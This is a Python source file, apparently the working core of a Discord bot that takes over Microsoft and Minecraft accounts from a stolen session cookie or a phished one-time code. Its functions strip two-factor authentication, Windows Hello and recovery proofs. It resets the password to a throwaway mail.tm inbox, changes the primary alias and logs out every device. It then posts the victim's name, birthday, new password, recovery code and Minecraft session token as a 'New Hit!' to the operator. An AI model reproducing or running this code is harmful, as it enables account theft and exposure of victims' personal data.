async def getAMRP(session: httpx.AsyncClient, T: str):
    fetchAMRP = await session.post(
        url="https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
        data={"t": T},
        follow_redirects=False
    )
    if "AMRPSSecAuth" in fetchAMRP.cookies:
        return True
    return None

async def remove2FA(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        "https://account.live.com/API/Proofs/DisableTfa",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Disabled 2FA")
    else:
        print("[X] - Failed to disable 2FA")

async def removeZyger(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        url="https://account.live.com/API/Proofs/RevokeWindowsHelloProofs",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Removed Zyger")
    else:
        print("[X] - Failed to remove Zyger")

async def removeProof(session: httpx.AsyncClient, apicanary: str):
    proofs = await session.get(
        "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://login.live.com/"
        },
        follow_redirects=False
    )
    proofIds = re.findall(r'"proofId":"([^"]+)"', proofs.text)
    decodedProofs = [codecs.decode(ID, "unicode_escape") for ID in proofIds]
    for proof in decodedProofs:
        await session.post(
            url="https://account.live.com/API/Proofs/DeleteProof",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "canary": apicanary
            },
            json={
                "proofId": proof,
                "uaid": "114b68368b7b46afa44c82a8246e4a44",
                "uiflvr": 1001,
                "scid": 100109,
                "hpgid": 201030
            }
        )
    print("[+] - Removed all Proofs")

async def removeServices(session: httpx.AsyncClient):
    uatRequest = await session.get(
        url="https://account.live.com/consent/Manage?guat=1",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://login.live.com/"
        }
    )
    client_ids = re.findall(r'client_id=([A-F0-9]{16})', uatRequest.text)
    if not client_ids:
        print("[+] - No Services Found")
        return
    print("[~] - Removing Services")
    for ID in client_ids:
        response = await session.get(
            url=f"https://account.live.com/consent/Edit?client_id={ID}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            follow_redirects=False
        )
        postURL = re.search(r'name="editConsentForm"[^>]*action="([^"]+)"', response.text).group(1)
        canary = quote(re.search(r'canary"[^>]*value="([^"]+)"', response.text).group(1), safe="")
        await session.post(
            url=postURL,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"canary={canary}",
            follow_redirects=False
        )
        print(f"[~] - Removed {ID}")

async def securityInformation(session: httpx.AsyncClient):
    secInfo = await session.get(url="https://account.live.com/proofs/Manage/additional")
    match = re.search(r'var\s+t0\s*=\s*(\{.*?\});', secInfo.text, re.DOTALL)
    return match.group(1)

async def getRecoveryCode(session: httpx.AsyncClient, apicanary: str, eni: str):
    data = await session.post(
        url="https://account.live.com/API/Proofs/GenerateRecoveryCode",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "encryptedNetId": eni,
            "uiflvr": 1001,
            "scid": 100109,
            "hpgid": 201030
        }
    )
    return data.json()["recoveryCode"]

async def generateEmail(email: str, password: str) -> list:
    async with httpx.AsyncClient(timeout=None) as session:
        getDomain = await session.get(url="https://api.mail.tm/domains", params={"page": 1})
        domain = getDomain.json()["hydra:member"][0]["domain"]
        finalEmail = f"{email}@{domain}"
        await session.post(
            url="https://api.mail.tm/accounts",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": finalEmail,
                "password": password
            }
        )
        token = await session.post(
            url="https://api.mail.tm/token",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": finalEmail,
                "password": password
            }
        )
        return [token.json()["token"], finalEmail]

async def getEmailCode(token: str) -> str:
    async with httpx.AsyncClient(timeout=None) as session:
        while True:
            checkEmails = await session.get(
                url="https://api.mail.tm/messages",
                headers={
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "authorization": f"Bearer {token}"
                }
            )
            rJson = checkEmails.json()
            if rJson:
                ID = rJson[0]["id"]
                getEmail = await session.get(
                    url=f"https://api.mail.tm/messages/{ID}",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "authorization": f"Bearer {token}"
                    }
                )
                emailText = getEmail.json()["text"]
                code = re.search(r'Security code:\s*(\d+)', emailText).group(1)
                return code
            await asyncio.sleep(0.8)

async def recover(email: str, recoveryCode: str, new_email: str, new_password: str, email_token: str):
    async with httpx.AsyncClient(timeout=None) as session:
        data = await session.get(url=f"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}")
        amsc = data.cookies["amsc"]
        serverData = json.loads(re.search(r"var\s+ServerData=(.*?)(?=;|$)", data.text).group(1))
        decoded_token = codecs.decode(unquote(serverData["sRecoveryToken"]), "unicode_escape")
        recToken = await session.post(
            url="https://account.live.com/API/Recovery/VerifyRecoveryCode",
            headers={
                "Content-type": "application/json; charset=utf-8",
                "Accept-encoding": "gzip, deflate, br, zstd",
                "Accept": "application/json",
                "Connection": "keep-alive",
                "Cookie": f"amsc={amsc}",
                "canary": serverData["apiCanary"],
                "hpgid": "200284",
                "hpgact": "0"
            },
            json={
                "recoveryCode": recoveryCode,
                "code": recoveryCode,
                "scid": 100103,
                "token": decoded_token,
                "uiflvr": 1001
            }
        )
        recJson = recToken.json()
        if recToken.status_code == 200:
            canary = recJson["apiCanary"]
            token = recJson["token"]
            sendCode = await session.post(
                url="https://account.live.com/api/Proofs/SendOtt",
                headers={
                    "Content-type": "application/json; charset=utf-8",
                    "Accept": "application/json",
                    "canary": canary,
                    "hpgid": "200284",
                    "hpgact": "0",
                    "Cookie": f"amsc={amsc}"
                },
                json={
                    "associationType": "None",
                    "action": "VerifyNewProof",
                    "channel": "Email",
                    "cxt": "MP",
                    "proofId": new_email,
                    "scid": 100103,
                    "token": token,
                    "uiflvr": 1001
                }
            )
            responseJson = sendCode.json()
            if "apiCanary" in responseJson:
                canary = responseJson["apiCanary"]
                code = await getEmailCode(email_token)
                verifyCodeResponse = await session.post(
                    url="https://account.live.com/API/Proofs/VerifyCode",
                    headers={
                        "Content-type": "application/json; charset=utf-8",
                        "Accept": "application/json",
                        "canary": canary,
                        "hpgid": "200284",
                        "hpgact": "0",
                        "Cookie": f"amsc={amsc}"
                    },
                    json={
                        "action": "VerifyOtc",
                        "proofId": new_email,
                        "scid": 100103,
                        "token": token,
                        "uiflvr": 1001,
                        "code": code
                    }
                )
                verifyCodeResponseJson = verifyCodeResponse.json()
                canary = verifyCodeResponseJson["apiCanary"]
                finishSecure = await session.post(
                    url="https://account.live.com/API/Recovery/RecoverUser",
                    headers={
                        "Content-type": "application/json; charset=utf-8",
                        "Accept": "application/json",
                        "canary": canary,
                        "hpgid": "200284",
                        "hpgact": "0",
                        "Cookie": f"amsc={amsc}"
                    },
                    json={
                        "contactEmail": new_email,
                        "contactEpid": "",
                        "password": new_password,
                        "passwordExpiryEnabled": 0,
                        "scid": 100103,
                        "token": token,
                        "uaid": "6b182876e51a429db0e2cff317076750",
                        "uiflvr": 1001
                    }
                )
                finishJson = finishSecure.json()
                if "recoveryCode" in finishJson:
                    return finishJson["recoveryCode"]
            return None

async def changePrimaryAlias(session: httpx.AsyncClient, emailName: str, apicanary: str) -> bool:
    try:
        getCanary = await session.get(url="https://account.live.com/AddAssocId", headers={"Content-Type": "application/x-www-form-urlencoded"})
        canary = quote(
            re.search(r'name="canary" value="([^"]+)"', getCanary.text).group(1),
            safe=""
        )
        await session.post(
            url="https://account.live.com/AddAssocId?ru=&cru=&fl=",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://account.live.com",
                "Referer": "https://account.live.com/AddAssocId"
            },
            data=f"canary={canary}&PostOption=LIVE&SingleDomain=&UpSell=&AddAssocIdOptions=LIVE&AssociatedIdLive={emailName}&DomainList=outlook.com"
        )
        pinfo = await session.post(
            url="https://account.live.com/API/MakePrimary",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "hpgid": "200176",
                "scid": "100141",
                "uiflvr": "1001",
                "canary": apicanary
            },
            json={
                "aliasName": f"{emailName}@outlook.com",
                "emailChecked": True,
                "removeOldPrimary": True,
                "uiflvr": 1001,
                "scid": 100141,
                "hpgid": 200176
            }
        )
        if "error" in pinfo.json():
            print(f"[X] - Failed to change Primary Alias")
            return False
        return True
    except Exception:
        print(f"[X] - Failed to change Primary Alias")
        return False

async def logoutAll(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        "https://account.live.com/API/Proofs/DeleteDevices",
        headers={"canary": apicanary},
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Sucessfully Logout all devices")
    else:
        print("[X] - Failed to logout of all devices")

async def secure(session: httpx.AsyncClient):
    ralias = config["autosecure"]["replace_main_alias"]
    database = DBConnection()
    
    apicanary = await getCookies(session)
    
    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "email": "Couldn't Change!",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "status": "Unknown",
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Not purchased",
        "capes": "No capes"
    }
    
    T = await getT(session)
    if not T:
        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
        return accountInfo
    
    print("[+] - Found T")
    verificationToken = await getAMC(session)
    ownerInfo = await getOwnerInfo(session, verificationToken)
    if ownerInfo:
        print("[+] - Got Owner Info")
        accountInfo["firstName"] = ownerInfo["Fname"]
        accountInfo["lastName"] = ownerInfo["Lname"]
        accountInfo["region"] = ownerInfo["region"]
        accountInfo["birthday"] = ownerInfo["birthday"]
        accountInfo["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
    
    print("[~] - Checking Minecraft Account")
    XBLResponse = await getXBL(session)
    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")
        xbl = XBLResponse["xbl"]
        ssid = await getSSID(xbl)
        if ssid:
            print("[+] - Got SSID! (Has Minecraft)")
            accountInfo["SSID"] = ssid
            capes = await getCapes(ssid)
            if capes:
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"
            profile = await getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["oldName"] = profile
                usernameInfo = await getUsernameInfo(ssid)
                if type(usernameInfo) is bool:
                    accountInfo["usernameInfo"] = "Yes"
                else:
                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"
            method = await getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")
    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["oldName"] = "No Minecraft"

    await getAMRP(session, T)
    print("[+] - Got AMRP")
    await remove2FA(session, apicanary)
    await removeZyger(session, apicanary)
    await removeProof(session, apicanary)
    await removeServices(session)
    
    securityParameters = json.loads(await securityInformation(session))
    print("[+] - Got Security Parameters")
    
    if securityParameters:
        mainEmail = securityParameters["email"]
        encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
        recoveryCode = await getRecoveryCode(session, apicanary, encryptedNetID)
        print(f"[+] - Got Recovery Code | {recoveryCode}")
        secEmail = uuid.uuid4().hex[:16]
        newPassword = uuid.uuid4().hex[:12]
        emailToken, secEmail = await generateEmail(secEmail, newPassword)
        print(f"[+] - Generated Security Email ({secEmail})")
        database.addEmail(secEmail, newPassword)
        print("[~] - Automaticly Securing Account...")
        newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken)
        if newData:
            accountInfo["secEmail"] = secEmail
            accountInfo["recoveryCode"] = newData
            accountInfo["password"] = newPassword
        else:
            print(f"[X] - Failed to secure this account")
        
        if ralias:
            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
            print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
            info = await changePrimaryAlias(session, primaryEmail, apicanary)
            if info:
                accountInfo["email"] = f"{primaryEmail}@outlook.com"
                print(f"[+] - Changed Primary Alias")
            else:
                accountInfo["email"] = mainEmail
        else:
            accountInfo["email"] = mainEmail
    
    await logoutAll(session, apicanary)
    print("[+] - Account has been secured")
    return accountInfo

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None):
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    print("[+] - Got Cookies! Polishing login cookie...")
    host = await polishHost(session, msaauth)
    print(f"MSAAUTH: {host}")
    if not msaauth:
        print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
        return None
    print("[+] - Got MSAAUTH | Starting to secure...")
    initialTime = time.time()
    account = await secure(session)
    finalTime = (time.time() - initialTime)
    
    infoEmbed = discord.Embed()
    infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    infoEmbed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    infoEmbed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    infoEmbed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
    
    hitEmbed = discord.Embed(
        title=f"New Hit! | Secured in {round(finalTime, 2)}s",
        color=0xE4D00A
    )
    hitEmbed.add_field(name="MC Username", value=f"```{account['oldName']}```", inline=False)
    hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
    hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
    hitEmbed.add_field(name="Email", value=f"```{account['email']}```", inline=False)
    hitEmbed.add_field(name="Security Email", value=f"```{account['secEmail']}```", inline=True)
    hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
    
    ssidEmbed = discord.Embed(
        title="SSID",
        description=f"```{account['SSID']}```",
        color=0x50C878
    ) if account["SSID"] else None
    
    return [hitEmbed, ssidEmbed, infoEmbed]

async def totp(secret: str) -> str | None:
    try:
        secret = secret.upper().replace(" ", "").replace("\n", "").replace("\r", "")
        padding = (8 - len(secret) % 8) % 8
        secret_padded = secret + "=" * padding
        k = base64.b32decode(secret_padded)
        c = int(time.time()) // 30
        h = hmac.new(k, struct.pack(">Q", c), hashlib.sha1).digest()
        o = h[-1] & 15
        code = struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff
        return f"{code % 1000000:06d}"
    except Exception:
        return None

async def fetchInbox(token: str) -> list | None:
    async with httpx.AsyncClient(timeout=None) as session:
        getEmails = await session.get(
            url="https://api.mail.tm/messages",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
                "authorization": f"Bearer {token}"
            }
        )
        emails = getEmails.json()
        emailsText = []
        if emails:
            for email in getEmails.json():
                response = await session.get(
                    url=f"https://api.mail.tm/messages/{email['id']}",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "authorization": f"Bearer {token}"
                    }
                )
                emailData = response.json()
                emailsText.append(emailData["text"])
            return emailsText
        return None

# ==================== BOT CLASS ====================
class DiscordBot(commands.Bot):
    def __init__(self):
        super().__init__(
            command_prefix="!",
            case_insensitive=True,
            intents=discord.Intents.all(),
            allowed_mentions=discord.AllowedMentions(roles=False, everyone=False, users=True)
        )
        self.logger = logging.getLogger("bot")
        self.admins = config["owners"]

    async def setup_hook(self) -> None:
        # Register commands directly
        self.tree.add_command(accounts_command)
        self.tree.add_command(reload_command)
        self.tree.add_command(auth_code_command)
        self.tree.add_command(check_locked_command)
        self.tree.add_command(requestotp_command)
        self.tree.add_command(secure_command)
        self.tree.add_command(inbox_command)
        self.tree.add_command(list_mails_command)
        self.tree.add_command(send_embed_command)
        self.tree.add_command(set_channel_command)

        # Load jishaku
        await self.load_extension("jishaku")

        # Create database table if it doesn't exist
        with DBConnection() as database:
            database.cursor.execute("""
                CREATE TABLE IF NOT EXISTS `security_emails` (
                    email TEXT,
                    password TEXT
                )
            """)
            database.conn.commit()

        # Sync commands globally once
        try:
            synced = await self.tree.sync()
            self.logger.info(f"Synced {len(synced)} application commands (global).")
        except Exception as e:
            self.logger.exception(f"Failed to sync application commands: {e}")

    async def on_ready(self):
        self.add_view(ButtonViewOne())
        self.add_view(ButtonViewThree())
        self.add_view(ButtonOptions(0))
        self.add_view(ButtonTOTP("", None))
        self.add_view(emailView([]))

        # Only run once
        if getattr(self, "_startup_done", False):
            return
        self._startup_done = True

        self.logger.info(f"Bot is ready as {self.user} (ID: {self.user.id})")
        self.logger.info(f"Connected to {len(self.guilds)} guilds")

    @staticmethod
    def setup_logging() -> None:
        logging.getLogger("discord").setLevel(logging.INFO)
        logging.getLogger("discord.http").setLevel(logging.WARNING)
        logging.getLogger("httpx").setLevel(logging.DEBUG)
        
        logging.basicConfig(
            level=logging.INFO,
            format="%(levelname)s | %(asctime)s | %(name)s | %(message)s",
            stream=sys.stdout,
        )

# ==================== COMMANDS ====================
@app_commands.command(name="accounts", description="Shows you all stored accounts")
async def accounts_command(interaction: discord.Interaction):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    await interaction.response.send_message(f"**This command is still in progress**", ephemeral=True)

@app_commands.command(name="reload")
async def reload_command(interaction: discord.Interaction, cog: str):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission!", ephemeral=True)
        return
    await interaction.client.reload_extension(cog)
    return await interaction.response.send_message(
        embed=discord.Embed(
            title="Reloaded Cogs",
            description=cog,
        )
    )

@reload_command.autocomplete(name="cog")
async def autocomplete_callback(interaction: discord.Interaction, current: str):
    options = [cog for cog in interaction.client.extensions.keys()]
    return [
        app_commands.Choice(name=option, value=option)
        for option in options
        if current.lower() in option.lower()
    ]

@app_commands.command(name="auth_code", description="Generates an OTP with a 2FA Secret")
async def auth_code_command(interaction: discord.Interaction, secret: str):
    if interaction.user.id not in interaction.client.admins:
        return await interaction.response.send_message("You do not have permission!", ephemeral=True)
    
    TOTP = await totp(secret.strip())
    if TOTP:
        await interaction.response.send_message(
            embed=discord.Embed(
                title="Authenticator Code",
                description=f"```{TOTP}```"
            ),
            view=ButtonTOTP(secret.strip(), interaction),
            ephemeral=True
        )
        return
    
    await interaction.response.send_message("This secret is invalid.", ephemeral=True)

@app_commands.command(name="check_locked", description="Checks if an account is locked")
async def check_locked_command(interaction: discord.Interaction, email: str):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    await interaction.response.defer()
    lockedInfo = await checkLocked(email)
    if lockedInfo:
        if lockedInfo["StatusCode"] != 500:
            if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                await interaction.followup.send(f"This email is **locked**", ephemeral=True)
                return
            else:
                await interaction.followup.send(f"This email is **not** locked", ephemeral=True)
                return
    await interaction.followup.send(f"Failed to check if this email is locked", ephemeral=True)

@app_commands.command(name="requestotp", description="Email OTP (2FA Bypass)")
async def requestotp_command(interaction: discord.Interaction, email: str):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    session = getSession()
    response = await sendAuth(session, email)
    if "OtcLoginEligibleProofs" in response["Credentials"]:
        for value in response["Credentials"]["OtcLoginEligibleProofs"]:
            if value["otcSent"]:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        description=f"Sucessfully sent OTP to `{value['display']}`",
                        color=0x678DC6
                    ),
                    ephemeral=True
                )
                return
    await interaction.response.send_message(
        embed=discord.Embed(
            description=f"Sucessfully sent OTP",
            color=0x678DC6
        ),
        ephemeral=True
    )

@app_commands.command(name="secure", description="Automaticly secures your account")
async def secure_command(interaction: discord.Interaction):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="Select Securing Method",
        description="""
        Choose how you want to authenticate:
        
        **MSAAUTH Token**
        Use your a microsoft account session cookie
        """
    )
    view = discord.ui.View()
    view.add_item(Dropdown())
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@app_commands.command(name="inbox", description="Shows the inbox of your email")
async def inbox_command(interaction: discord.Interaction, email: str):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    with DBConnection() as db:
        password = db.getEmailPassword(email)
        if not password:
            await interaction.response.send_message(
                embed=discord.Embed(
                    description="This email has not been found",
                    color=0xFF5C5C
                ),
                ephemeral=True
            )
            return
    async with httpx.AsyncClient(timeout=None) as session:
        data = await session.post(
            url="https://api.mail.tm/token",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": email,
                "password": password[0]
            }
        )
        token = data.json()["token"]
    emails = await fetchInbox(token)
    if not emails:
        await interaction.response.send_message(
            embed=discord.Embed(
                title="No Emails Found",
                description="You don't have any emails stored",
                color=0xFF5C5C
            ),
            ephemeral=True
        )
        return
    view = emailView(emails)
    await interaction.response.send_message(
        embed=view.getEmbed(),
        view=view,
        ephemeral=True
    )

@app_commands.command(name="list_mails", description="Lists all security emails")
async def list_mails_command(interaction: discord.Interaction):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    with DBConnection() as database:
        emails = list(database.getEmails())
    if not emails:
        await interaction.response.send_message(
            embed=discord.Embed(
                title="No Emails Found",
                description="You don't have any emails stored",
                color=0xFF5C5C
            ),
            ephemeral=True
        )
        return
    embed = discord.Embed(
        title="Security Email",
        description=f"{len(emails)} Email(s) have been found:\n",
        color=0x678DC6,
    ).set_footer(text="These emails are automaticly deleted after 7 days")
    for email in emails:
        embed.description += f"\n- {email[0]}"
    await interaction.response.send_message(embed=embed, ephemeral=True)

@app_commands.command(name="send_embed", description="Sends the verification embed")
@app_commands.choices(
    type=[
        app_commands.Choice(name="Default", value="default"),
        app_commands.Choice(name="Custom", value="custom")
    ]
)
async def send_embed_command(interaction: discord.Interaction, type: app_commands.Choice[str]):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message(
            "You do not have permission to execute this command!",
            ephemeral=True
        )
        return
    
    config = json.load(open("config.json", "r+"))
    if not config["discord"]["accounts_channel"]:
        await interaction.response.send_message(
            "You must set the Accounts channel first with /set_channel!",
            ephemeral=True
        )
        return
    
    match type.value:
        case "default":
            dembed = embeds["default_embed"]
            await interaction.response.defer(ephemeral=True)
            await interaction.channel.send(
                embed=discord.Embed(
                    title=dembed[0],
                    description=dembed[1],
                    color=0x678DC6
                ),
                view=ButtonViewOne()
            )
            await interaction.followup.send("Sent!", ephemeral=True)
        case "custom":
            await interaction.response.send_modal(MyModalThree())

@app_commands.command(name="set_channel", description="Sets your channel ID")
@app_commands.choices(
    choice=[
        app_commands.Choice(name="Hits", value="accounts_channel"),
    ]
)
async def set_channel_command(interaction: discord.Interaction, choice: app_commands.Choice[str]):
    if interaction.user.id not in interaction.client.admins:
        await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
        return
    
    with open("config.json", "r") as config_file:
        newConfig = json.load(config_file)
    
    match choice.value:
        case "accounts_channel":
            newConfig["discord"]["accounts_channel"] = int(interaction.channel_id)
    
    with open("config.json", "w") as config_file:
        json.dump(newConfig, config_file, indent=4)
    
    await interaction.response.send_message(f"Successfully set {choice.name} channel!", ephemeral=True)

# ==================== MAIN ====================
bot = DiscordBot()
bot.remove_command("help")
bot.setup_logging()
bot.run(
    config["tokens"]["bot_token"],
    log_handler=None
)